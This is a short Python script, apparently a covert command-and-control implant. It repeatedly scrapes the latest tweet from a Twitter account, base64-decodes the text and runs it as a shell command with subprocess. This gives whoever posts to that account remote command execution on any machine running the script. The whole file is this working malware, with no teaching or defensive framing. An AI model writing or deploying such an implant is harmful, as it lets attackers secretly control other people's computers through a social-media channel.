from bs4 import BeautifulSoup as mySoup
import base64, requests, subprocess, random, time

def main():
    lastTweet = '' 
    while True:
        html = requests.get('https://twitter.com/S1mpleCC').text
        soup = mySoup(html,"html.parser")
        tweet = str(soup.find('p',{"class":'tweet-text'}).get_text())
        if tweet != lastTweet:
            payload = base64.b64decode(tweet.encode("utf-8")).decode("utf-8")
            p = subprocess.Popen(payload, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out = str(p.stdout.read() + p.stderr.read())
            lastTweet = tweet
        time.sleep(random.randint(1,5))

main()
